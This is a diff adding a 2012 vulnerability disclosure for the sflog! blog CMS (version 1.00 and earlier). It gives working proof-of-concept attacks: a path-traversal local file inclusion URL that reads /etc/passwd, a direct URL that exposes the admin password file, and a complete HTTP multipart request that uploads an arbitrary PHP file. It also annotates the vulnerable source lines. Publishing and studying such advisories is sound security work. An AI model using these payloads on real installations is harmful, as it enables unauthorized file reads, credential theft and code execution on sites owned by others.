@@ -1,0 +1,126 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+ 
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-07-05                              ]
+ #################################################
+ # [ sflog! <= 1.00 ]  Multiple Vulnerabilities  #
+ #################################################
+ #
+ # Script: "sflog! is a flat and light CMS::Blog system."
+ #
+ # Vendor:   http://sourceforge.net/projects/sflog/
+ # Download: http://sourceforge.net/projects/sflog/files/sflog/
+ #
+ #
+ # [ LFI ]
+ #
+ # PoC: http://localhost/sflog/index.php?blog=admin&section=../../../../../../../etc/&permalink=passwd
+ #
+ # File: ./sflog/index.php (lines: 1, 53)
+ #    ..cut..
+ #    1   <?php include("./includes/pageHeader.inc.php"); ?>      // 1
+ #    ..cut..
+ #
+ #    53  require_once("./includes/entries.inc.php");             // 4
+ #    ..cut..
+ #
+ # File: ./sflog/includes/pageHeader.inc.php (lines: 20, 35)
+ #    ..cut..
+ #    20   $_blogID = $_GET['blog'];                              // 2
+ #    ..cut..
+ #
+ #    35  $_sectionID = $_GET['section'];                         // 3
+ #    ..cut..
+ #
+ # File: ./sflog/includes/entries.inc.php (lines: 2-11)
+ #    ..cut..
+ #    2  include_once("./cms/BlogEntry.class.php");               // 5
+ #    3  include_once("./cms/Blog.class.php");
+ #    4  $blog = new BlogEntry($_blogID,$_sectionID);             // 6
+ #    5  $cms = new Blog();
+ #    6  $pages = $cms->getPostPerPage($_blogID);
+ #    7
+ #    8  // checks for permalink
+ #    9  if (isset($_GET['permalink'])){
+ #   10      $_permalink = $_GET['permalink'];                    // 8
+ #   11      $blog->showEntry($_permalink);                       // 9
+ #    ..cut..
+ #
+ # File: ./sflog/cms/BlogEntry.class.php (lines: 37-85)
+ #    ..cut..
+ #   37 class BlogEntry {
+ #    ..cut..
+ #   47  function BlogEntry($blogID,$sectionID){                  // 7
+ #   48       error_reporting(E_USER_ERROR);                      //
+ #   49       $this->blogID = $blogID;                            //
+ #   50       $this->sectionID = $sectionID;                      //
+ #   51   }
+ #    ..cut..
+ #   57   function showEntry($entryID){                           // 10
+ #    ..cut..
+ #   60        $JournalContentDir = "./blogs/".$this->blogID."/data/".$this->sectionID; // 11
+ #    ..cut..
+ #   80        $JournalContent = $JournalContentDir."/".$entryID; // 12
+ #    ..cut.. 
+ #   83        include_once $JournalContent;                      // 13  [LFI]
+ #    ..cut..
+ # 
+ #################################################
+ # [ Admin Password Disclosure ]
+ #
+ # PoC: http://localhost/sflog/admin/passwd
+ # 
+ #################################################
+ # [ Arbitrary File Upload ]
+ #
+ # File: ./sflog/admin/includes/uploadContent.inc.php (lines: 62-72)
+ #    ..cut..
+ #    62   if (trim($_FILES['fileID']['name'])!=''){
+ #    63     $uploaddir = BLOG_PATH.$blogID.BLOG_UPLOADS;
+ #    64     $uploadfile = $uploaddir . basename($_FILES['fileID']['name']);
+ #    65     echo '<pre>';
+ #    66     if (move_uploaded_file($_FILES['fileID']['tmp_name'], $uploadfile)) {
+ #    67       print(UPLOAD_SUCCESS);
+ #    68     } else {
+ #    69       print('<font color="red">'.UPLOAD_FAILED.'</font>');
+ #    70     }
+ #    71     print "</pre>";
+ #    72   }
+ #    ..cut..
+ #
+ # PoC:
+ #
+ # POST /sflog/admin/includes/uploadContent.inc.php HTTP/1.1
+ # Host: localhost
+ # User-Agent: Mozilla/5.0
+ # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ # Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ # Accept-Encoding: gzip, deflate
+ # Connection: keep-alive
+ # Content-Type: multipart/form-data; boundary=---------------------------4827543632391
+ # Content-Length: 411
+ # -----------------------------4827543632391
+ # Content-Disposition: form-data; name="blogID"
+ # 
+ # admin
+ # -----------------------------4827543632391
+ # Content-Disposition: form-data; name="MAX_FILE_SIZE"
+ # 
+ # 0
+ # -----------------------------4827543632391
+ # Content-Disposition: form-data; name="fileID"; filename="info.php"
+ # Content-Type: text/x-php
+ # 
+ # <?php phpinfo(); ?>
+ # 
+ # -----------------------------4827543632391--
+ # 
+ # 
+ # Uploaded file will be here: http://localhost/sflog/blogs/admin/uploads/info.php
+ # 
+ ### [ dun / 2012 ] #####################################################
